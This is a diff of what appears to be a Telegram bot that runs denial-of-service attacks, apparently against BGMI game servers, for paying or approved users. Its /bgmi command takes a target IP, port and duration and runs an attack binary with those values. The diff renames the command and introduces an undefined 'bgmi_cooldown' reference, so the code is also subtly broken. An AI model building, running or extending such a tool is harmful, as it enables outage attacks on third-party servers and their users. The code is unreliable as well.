@@ -288,14 +288,14 @@ bgmi1_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /bgmi1 command
-@bot.message_handler(commands=['bgmi1'])
+@bot.message_handler(commands=['bgmi'])
 def handle_bgmi1(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi1_cooldown and (datetime.datetime.now() - bgmi1_cooldown[user_id]).seconds < COOLDOWN_TIME:
+            if user_id in bgmi1_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                 response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi1 Command Again."
                 bot.reply_to(message, response)
                 return
@@ -310,7 +310,7 @@ def handle_bgmi1(message):
             if time > 240:
                 response = "Error: Time interval must be less than 240."
             else:
-                record_command_logs(user_id, '/bgmi1', target, port, time)
+                record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 700"
@@ -318,7 +318,7 @@ def handle_bgmi1(message):
                 response = f"bgmi1 Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            response = "✅ Usage :- /bgmi1 <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
         response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi1 @vikas200807")
 
